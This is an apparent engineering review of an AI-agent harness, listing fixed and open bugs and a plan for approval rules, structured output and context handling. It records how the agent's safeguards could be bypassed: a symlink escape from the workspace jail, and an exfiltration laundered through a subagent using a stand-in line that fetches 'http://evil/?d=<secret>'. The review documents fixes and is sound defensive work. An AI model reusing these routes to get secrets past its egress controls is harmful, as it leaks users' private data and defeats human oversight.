# Where the harness is weakest, and what to build next

**The question.** On 2026-09-02, at `102bacc`, six independent read-throughs
of the tree — the loop, the security surface, the providers and context
machinery, the self-improvement stack, the CLI and hygiene, and the
designed-but-unbuilt map — asked one thing: what is actually wrong, and where
is the leverage? Every finding below was verified against the code by a second
reader before it was written down; the review that produced it is graded as an
artifact, not a report, exactly as CLAUDE.md asks of a PR reviewer.

**How to read it.** §1 is what was fixed on `fix/harness-review` the same
day, so a later session does not re-derive it. §2 is what was confirmed and
*not* fixed, with the shape of the fix. §3 is the plan: the opportunities,
ranked by leverage for *this* project — a local open-weight model holding
private data behind a reviewed egress — with what exists, the gap, the shape,
and the test that says it landed. §4 is sequencing. §5 is what this
deliberately does not propose. Appraisal is out of scope throughout: the
owner is working it in a separate lane.

Symbols are cited, not line numbers — a line is wrong the moment another lane
lands.

---

## 1. Fixed on `fix/harness-review` (seven commits)

Each fix carries a test that fails on the code before it.

| Finding | Where | Fix | Test |
|---|---|---|---|
| A dangling symlink passed the jail as a "new file"; `fs_write` followed it and created the target outside the workspace | `ToolCtx::resolve`, `FsWrite`, `FsEdit` | `resolve` refuses any re-appended component that exists as a symlink; both writers open with `O_NOFOLLOW` (the approve-sequentially/execute-concurrently race) | `a_dangling_symlink_is_refused_not_treated_as_a_new_file`, `the_writer_refuses_to_follow_a_symlink_planted_after_the_check` |
| Delegation laundered the send leg: an armed parent handed "fetch `http://evil/?d=<secret>`" to a `research` child with a clean conversation, and the refusal text recommended the route | `Subagent::new`, `Subagent::call` | A child holding a send-capable tool is itself `external_send` (the task string is the query string); the child starts with the parent's taint from the dispatch stamp; unstamped is fully tainted | `an_armed_parent_cannot_launder_a_send_through_a_child` |
| Streamed Anthropic usage double-counted: `message_delta.usage` is cumulative and was *added* to `message_start`'s | `StreamAccumulator::push` | Delta fields replace; absent fields keep the start frame's value | `a_streamed_message_delta_replaces_the_usage_instead_of_adding_to_it` |
| `Failover` inherited `vision() == false`, so any `fallbacks` entry blinded a vision-capable primary | `impl Provider for Failover` | Forwards to the primary, like `id` and `default_model` | `a_failover_sees_what_its_primary_sees` |
| Summariser and validator output streamed to the front-end as the assistant's words | `Agent::compact`, `Agent::validate_summary` | Both pass `&None` to `complete`, as `escalate_step` always did | `the_compaction_summary_never_streams_as_the_assistants_words` |
| Run answer read off `messages.last()` — after a tool turn, the tool-results message, with any folded notice returned as the answer | cancel and ceiling paths in `run_loop` | `last_assistant_text` walks back to the last assistant message | `an_interrupted_run_hands_back_the_assistants_words_not_the_tail` |
| `trifecta = "ask"` equalled `"allow"` under `ModeApprover { Allow }` (eval, replay, `--yes`, headless) | `Approver`, `run_tools`, four CLI approvers | `Approver::escalate(tool, input, why)`, default `Blocked`; interactive approvers override past their "always" lists and modes | `ask_policy_blocks_when_the_approver_cannot_reach_a_person`, `ask_policy_escalates_to_an_approver_that_can_ask` |
| Errors built for untrusted tools were `external: false`, so remote error text entered untainted | `run_tools` `Err` arm, `McpTool::call`, `http_fetch` redirect, `web_search` backend errors | Built errors take the tool's declared reach; the tool arms are `from_outside` | `an_untrusted_tools_error_still_taints_the_conversation` |
| A panicking tool unwound out of `run_in` with a `tool_use` pushed and no result; Slack's thread conversation vanished | `run_tools` | `catch_unwind` per call; the panic becomes an error result | `a_panicking_tool_costs_the_call_not_the_run` |
| OpenAI-compatible decoder read llama-server's mid-stream `{"error": …}` frame as an empty chunk; overflow text never reached `is_context_overflow` | `accept_frame` | Bails with the message verbatim, no `ProviderError` in the chain | `a_mid_stream_error_frame_is_an_error_that_still_names_the_overflow` |
| Both decoders accepted a stream that simply ended as a finished turn | `Accumulator::closed_cleanly`, `StreamAccumulator::closed_cleanly` | Requires `[DONE]`/`message_stop` or a finish reason | `a_stream_that_ends_without_*` (both files) |
| Closed enums in the session store failed the whole record on an unknown variant | `lenient_message`, `lenient_stop_cause` in `session.rs` | A message keeps the blocks this build can read; `stop_cause` degrades to `None` | `records_from_a_newer_build_degrade_to_what_this_one_can_read` |
| Unknown `[agent] timezone` fell back to the machine's zone with a warning | `Config::validate` | Load error naming the fix | `an_unknown_timezone_is_a_load_error_not_a_warning` |
| The layer-parity test covered `ConfigLayer` only, by its own admission | `config.rs` tests | A second walk over every nested `*Layer` struct (30+ fields, all applied today) | `every_field_a_nested_layer_can_read_is_a_field_apply_reads` |
| A pure sender registered before `[outbox] tools` named it was live with no notice | `Registry::senders`, `setup.rs` | Startup warning per unrouted sender, beside the two routing warnings | `senders_are_the_pure_sends_not_the_shell_or_the_fetch` |

Doc drift corrected on the same branch: `website/docs/principles.md` (compaction
default; rule retirement is a measurement, not a human's acceptance),
`ARCHITECTURE.md` §Compaction ("off by default" while the code derived a
threshold), `MEMORY-RESEARCH.md` R3 (15 → 25), `CONTEXT-RESEARCH.md`
implications 3 and 5 (shipped 2026-08-05, unstruck — a session re-proposed
spilling from that line), `TRIFECTA.md` channels 2 and 4 and the `ask` row.

## 2. Confirmed, not fixed

Ranked by cost of leaving it. None blocks the plan; each is one small PR.

| Finding | Where | Shape of the fix |
|---|---|---|
| The compaction head grows without bound: `rebuild` pushes a new `SUMMARY_HEADER` block onto `messages[0]` every compaction and `cut_point` starts at 1, so summaries stack and are never re-summarised | `compact.rs` | Fold the previous summary into the next summariser's input and replace, not append; test that two compactions leave one summary block |
| The 900 s `reqwest` timeout bounds the whole exchange, streamed body included; at `LOCAL_MAX_TOKENS = 32_768` and ~60 tok/s a long answer dies mid-stream as a plain error and the partial is discarded | both providers | Read timeout per chunk instead of a whole-request timeout; a stall is the failure, not a long answer |
| `final_answer` pushes a bare `Message::user(FINAL_ANSWER_NUDGE)`, the two-consecutive-user shape the file itself calls invalid; `PauseTurn => continue` lets the next fold point do the same | `run_loop` | Route both through `append_user_text` |
| `Failover::id()` reports the primary, so a fallback-served turn is recorded under the wrong provider id | `provider/mod.rs` | Record the serving provider on the response; the session already records the model |
| `mecha config show` prints `api_key` and `[[mcp]].env` values; `ProviderConfig` derives `Debug` with the key unredacted | `commands/config.rs`, `config.rs` | A redaction pass on `show`; a manual `Debug` that elides the key |
| `search.rs` logs `error = %e` from reqwest, whose Display includes the URL — a SearXNG query carries the model-authored text | `search.rs` | Log the backend name and status, never the URL |
| Two webpki root bundles (`webpki-roots` 0.26 via tungstenite, 1.0 via reqwest) despite a comment saying one; `base64 = "0.23"` pinned ad hoc in `mecha-mail` beside the workspace's 0.22 | `Cargo.toml` files | Align the tungstenite feature with reqwest's; `base64.workspace = true` |
| `release.yml` does not build `web/dist`, so an installed binary serves no assets until someone runs `npm run build` | `.github/workflows/release.yml` | Build the frontend in the release job; assert the asset directory is non-empty |
| Rule *size* budget is advisory (`RULES_CHAR_BUDGET` warns at 03:30); only the count cap refuses. The prefix cost is bytes | `learn.rs` | Refuse over the byte budget as `budget_refuses` does over the count |
| `set_override` replaces an entry on the same key but leaves the superseded candidate `STATUS_ACCEPTED`; `harness list` can show two accepted for one live knob | `harness.rs` | Mark the superseded candidate at replacement time |
| Replay never arms the untrusted leg (`ReplayTool::call` returns `external: false`; `RecordedCall` has no `external`), so "recorded config" replays under cleaner taint than recorded | `replay_run.rs` | Record `external` per call and replay it |
| `Rule.confidence` is model-emitted and rendered back, against the design's "no model-rated confidence anywhere"; unused in policy | `learning.rs` | Drop the field or stop rendering it |
| Nothing checks `max_tokens` against `--reasoning-budget`; CLAUDE.md's "clients refuse that by name" is `StopCause::NoOutput`'s message after the fact | `onboarding.rs` / `doctor.rs` | An onboarding item that reads `/props` and compares |
| `process_alive` returns true on `EPERM`, so a reused pid keeps a permit seat or a running marker | `permit.rs`, `runmarker.rs` | Compare process start time beside the pid |
| The `if results.is_empty()` guard after `run_tools` cannot fire, and if it did it would return with a `tool_use` pushed and no results | `run_loop` | Delete it |
| `slot.lock().unwrap()` on `step_escalation` panics on poison where `take_queued_input` recovers with `into_inner()` | `run_loop` | Same policy in both places |
| `is_internal` omits NAT64 `64:ff9b::/96` and 6to4 `2002::/16` | `builtin.rs` | Add the ranges; host-dependent reachability |
| Hooks spawn `sh -c` with mecha's full environment; `Sandbox::child_env` exists | `hooks.rs` | Hooks are user-authored, so this is hygiene, not a hole |
| `Session::append` is an unbuffered `writeln!` with no lock; two attachers can interleave a body and its newline | `session.rs` | An advisory lock per append, or one writer per file |
| Design-doc drift in the goal system: "three sensors ship with no consumer" while `diagnose::Evidence` renders peak pressure and mean guilt into the diagnostician's brief; `Affect` "never reported" while `distill` writes the label to pkg per GOAL-SYSTEM §10 | CLAUDE.md, `ARCHITECTURE.md`, `guilt.rs` | The owner's lane (appraisal); left for it |

## 3. The plan

Ranked by leverage for this project. Each item is one PR through the review
loop, with a test named up front. Sizes: **S** under a day, **M** a few days,
**L** a week or more.

### 3.1 Per-command approval policy, with argv binding — L

**What exists.** `ModeApprover::approve` takes `_input` and ignores it;
`TuiApprover` and `TerminalApprover` remember "always" per tool name;
`Approver::escalate` (new on this branch) is the one place a call's input
reaches a person by design. `shell: ls` and `shell: rm -rf` are one decision.

**The gap.** The registry is 63 tools (41 MCP). The harness research cites
approve rates above 90% under fatigue, which is the approver ceasing to be a
control. There is no rule surface at all, and the approve-then-execute window
that `O_NOFOLLOW` closed for the filesystem is open for everything else.

**Why here.** This is the only lever that tightens *inside* a sandbox — a
confined shell that can still `curl` in its own namespace is confined, not
harmless — and the only thing that makes `sandbox = none` survivable. The spec
is complete in `PRIOR-ART-RESEARCH.md` §4: TOML `[[rule]]` with
`allow | prompt | forbid`, most-restrictive wins, `match`/`not_match` examples
validated at startup, a conservative splitter that returns `None` on anything
with substitution, redirection, globs or control flow, `strict_inline_eval`
on by default, and argv binding checked immediately before execution.

**Shape.** `ExecPolicy::decide(tool, input) -> Option<RuleDecision>` consulted
inside `ModeApprover` before the mode; `split_segments` as a pure function;
`Forbid` returns `Decision::Blocked` (machine policy, never mined). Ordering
stays interlock → hook → approver; a rule narrows and never loosens.

**Landed when.** The five tests in the spec pass, plus: a `forbid` rule
denies with an approver that panics if consulted; an armed trifecta still
refuses `external_send` whatever any rule says; a call approved with one argv
and dispatched with another is refused.

### 3.2 Structured output on the `Provider` trait — M

**What exists.** `Provider` exposes `id`, `default_model`, `vision`,
`complete`. `quarantine.rs`, `mail_triage.rs`, `frontdoor.rs`, `diagnose.rs`
and the eval judge all parse model JSON by hope, with retries on failure.
`LLAMA-SERVER.md` measured `response_format: json_schema` coexisting with
thinking on the served model.

**The gap.** For a weak local model, per-step reliability is the whole game
(`HARNESS-RESEARCH.md` §5: per-step gains compound exponentially into
horizon). A closed enum the sampler cannot violate is exactly "a typed
verdict the privileged run reads" — the front door's design — enforced by the
decoder instead of a parser.

**Shape.** `CompletionRequest.response_schema: Option<Value>`; `openai.rs`
spells it as `response_format: {type: json_schema}`, `anthropic.rs` as
`output_config.format`; a provider that cannot honour it says so
(`Provider::supports_schema`) rather than silently ignoring it — the
silently-degrading-guard rule. Adopt first in `QuarantinedPass`, whose
callers already define the shapes.

**Landed when.** A `ScriptedProvider` test asserts the schema is sent;
`mail_triage`'s verdict parse has no fallback branch left; the triage eval's
malformed-verdict rate is measured before and after.

### 3.3 Tool-surface reduction per surface — M

**What exists.** `Registry` is a `BTreeMap` (stable order — the cached
prefix), `--tool` narrows per run, skill restrictions narrow per activation.
`CONTEXT-RESEARCH.md` §4 prices tool definitions at 74.7% of the addressable
prompt at 31 tools; the live registry is 63.

**The gap.** Fewer visible candidates is worth 6–16pp even with the right
tool present, and Llama-class models lose 44–72% at large catalogs. Deferred
loading was "in the backlog already" in PRIOR-ART and is in no backlog.

**Shape.** Not per-turn toggling — that re-pays the whole prefix every run.
Per-*surface* allowlists in config (`[surfaces.slack] tools = [...]`,
`[surfaces.trigger]`), applied at setup like `--tool`, so each surface's
prefix is stable and smaller. A directory tool (`tool_search` over the hidden
remainder) only if the allowlists are not enough; it changes the prefix once
per surface, not per turn.

**Landed when.** `mecha tools --json --surface slack` lists the narrowed set;
a test asserts the registry order and spec bytes are identical across two
runs on one surface; the cache lens shows no `Drop` on the second run.

### 3.4 Surface the cache lens and the stream-usage sanity check — S

**What exists.** `CacheLens::Verdict::Drop` goes to `tracing::warn!` and
nowhere else; `RunStats` has `compactions` and `context_overflows` but no
cache-drop count; `doctor` and `runlog` cannot see prefix thrash. On
llama-server a cold miss at 170k tokens is ~120 s of prefill.

**Shape.** `RunStats.cache_drops: u32` with the serde default; the lens
increments it; `doctor` thresholds it; `runlog` reports the rate as an
`Option` over a non-empty denominator. Beside it, one self-check the
streaming bug earned: a `debug_assert` (and a doctor finding) when a streamed
turn's `total_input` exceeds the declared window — the number that fed
compaction was impossible and nothing said so.

**Landed when.** A `ScriptedProvider` run with usage crafted to produce a
`Drop` records `cache_drops: 1`; `doctor` names it.

### 3.5 Context: prune on a cadence, rule on the threshold, stop stacking summaries — M

**What exists.** `thin_old_results` and `evict_superseded_results` fire only
at compaction or overflow; `COMPACT_FRACTION` 0.66 became 173,015 tokens when
the window moved 8× and nobody chose it; summaries stack (§2, first row).

**The gap.** At 262k, thinning nothing until 173k and then summarising in one
event is the worst of both: long distractor tails *and* a lossy cut. Every
ablation in `CONTEXT-RESEARCH.md` puts summarisation below keeping history.

**Shape.** Three parts, in order: (a) re-summarise rather than stack — fold
the standing summary into the next summariser's input (S, and a correctness
fix); (b) `[agent] prune_at_fraction`, off by default, gated on cache TTL so
pruning never spends more on recaching than it saves (PRIOR-ART §5, S); (c)
the threshold ruling the HANDOFF already flags, informed by the goal-system
section's margin arithmetic and the `TokensRemaining` shape from
CONTEXT-RESEARCH implication 7 (a decision, then S).

**Landed when.** Two compactions leave one summary block; the compacted-chain
eval cases at k=5 with pruning on and off, with cache-read counts from the
recorded usage — if cache reads collapse, the cadence is wrong.

### 3.6 Thin the CLI into core — M, in slices

**What exists.** `mecha-cli` is 78k lines against core's 74k. Logic with
unit-testable decisions living in the binary: the mail triage driver
(`commands/mail.rs`: `classify`, `score`, `correct`, `reflect`, `eval`,
`corpus_threads`, 2,411 lines, 4 tests), session stats and pricing
(`commands/sessions.rs`, 1,063 lines, 0 tests), a JSON store with
tmp+rename and sweeps (`slack/remote.rs::RemoteStore`), and text parsing of
another binary's output (`commands/review.rs`). `tui/mod.rs` is 10,836 lines
in one file with 58 tests.

**Shape.** One slice per PR, each moving a pure decision into core with the
tests it never had: `mail_triage::score` and the corpus reader first (the
scoring is what the triage eval grades); `runlog` absorbs session
stats/pricing; `RemoteStore` becomes a core store like the outbox; `review.rs`
gets a `--json` on the binary it parses instead of a parser. Then split
`tui/mod.rs` by modal, keeping `list_height` the one sizing path.

**Landed when.** Each moved function has a unit test in core; `commands/*.rs`
files shrink to argument parsing and rendering; `cargo test -- --list` shows
the tests moved, not lost (a test-count delta is a commit delta).

### 3.7 Split `agent.rs` along its seams, and move incident history out — M

**What exists.** 9,400 lines: ~2,200 code, ~1,400 comment, ~5,800 test.
`run_loop` ~920 lines, `run_tools` ~620. The 40% comment density is incident
history CLAUDE.md says belongs in `ARCHITECTURE.md`.

**Shape.** `RunContext`/`Budget`/`Phase` → `run_context.rs`;
`Taint`/`Conversation` → `conversation.rs`; `StopCause`/`RunOutcome`/
`ToolCallTrace`/`emit_done` → `outcome.rs`; `run_tools` → `dispatch.rs`; the
four quarantined side-calls (`compact`, `validate_summary`, `escalate_step`,
`final_answer`) → one module; the ~200-line between-turns compaction block →
`maybe_compact_between_turns`. Tests split by concern under `agent/tests/`.
Each incident paragraph moves to the ARCHITECTURE section it belongs to,
leaving a one-line pointer.

**Landed when.** No behaviour change: the suite is identical before and after
(`cargo test -- --list` diffed), and `agent.rs` is under 1,500 lines.

### 3.8 Trim the self-improvement stack where it is not earning its size — S each

**What exists.** `guilt.rs` (475 lines) has one reader, `diagnose::Evidence`'s
counters brief; `gossip.rs` (2,265 lines) is a mecha-graph feature living in
mecha-core with read-only graph tools. The gate (`candidate.rs`,
`runlog.rs`), `doctor.rs` and the learning ledger earn their size and are not
touched. Appraisal is the owner's lane and is not in scope.

**Shape.** Decide, per module, with the design doc open (GOAL-SYSTEM §7.4 for
guilt; the graph docs for gossip): keep with a named consumer, or move
`gossip` to the graph repo behind its MCP surface. Neither is a bug; both are
weight in the expensive crate.

**Landed when.** The design doc's status line for each says what was decided,
and CLAUDE.md's "sensors with no consumer" sentence is true again.

### 3.9 Finish the benchmark loop: k=5 and AgentDojo — L, mostly wall clock

**What exists.** Terminal-Bench k=1 at 34/75 (2026-08-11) in `bench/`; the
binary last verified at 0.1.6; `eval --runs` exists and no scorecard outside
the compaction arc uses it.

**The gap.** AgentDojo is the only external measurement of the interlock's
*utility cost* — nothing in the repo prices a false refusal, and §1's
delegation fix just made refusals more common by design. k=5 turns a 45%
single-run number into one that can be compared.

**Landed when.** `results/` carries `runs: 5` for `ambiguity` and
`long-horizon`; an AgentDojo scorecard records the interlock's refusal rate
on benign tasks beside its catch rate on attacks.

### 3.10 Malformed tool-call recovery with a hint — S

**What exists.** Both providers wrap unparseable arguments as
`{"__malformed_arguments": raw}` and count them; nothing in `agent.rs` or
`tool/mod.rs` reads the key, so the tool fails on a missing field and the
model gets a generic error.

**Shape.** In `run_tools`, before dispatch: if the input carries the key,
return an error result that quotes the raw text and says "arguments were not
valid JSON" — a targeted hint for one retry. Low priority only because
`--jinja` grammar keeps the count near zero on this server.

## 4. Sequencing

1. **Now:** merge `fix/harness-review` through the review loop; the §2 rows
   are follow-up PRs in the order listed, the first three first.
2. **Next, in parallel** (different files, empty `comm -12`): 3.1 approval
   policy and 3.2 structured output. Both are specified; neither waits on
   the other.
3. **Then:** 3.3 tool surface and 3.4 observability — 3.4 first, because it
   is the instrument that says whether 3.3 kept the prefix stable.
4. **Then:** 3.5 context, with 3.9's k=5 runs as the measurement.
5. **Ongoing, one slice per PR:** 3.6 and 3.7. Pure moves, no behaviour
   change, each verified by a diffed test list.
6. **When the owner's appraisal lane lands:** 3.8, with the goal-system
   design doc open.

## 5. Deliberately not proposed

Each was weighed and refused by a research doc this project already wrote:

- **A planner or in-run LLM critic** — `VERIFICATION-RESEARCH.md` and
  `HARNESS-RESEARCH.md` §8.4: verification has to be a command's exit code,
  not a model's opinion of its own work.
- **Micro-compaction on every turn** — the cached prefix is load-bearing;
  trimming per turn spends more on recaching than it saves (PRIOR-ART §5).
- **Model-reviewed approvals** — a human clicking "yes" is what an injection
  engineers; a model clicking it is worse.
- **Programmatic tool calling** — the largest unexplored token lever per the
  docs, gated on two unsolved hazards (taint updating inside a program; one
  approval for thirty calls). Behind 3.1 and 3.2.
- **Loosening any interlock for convenience** — the answer to a refusal is
  §3.1's rules, §3.2's shapes, or `ask`, never `trifecta = "allow"`.
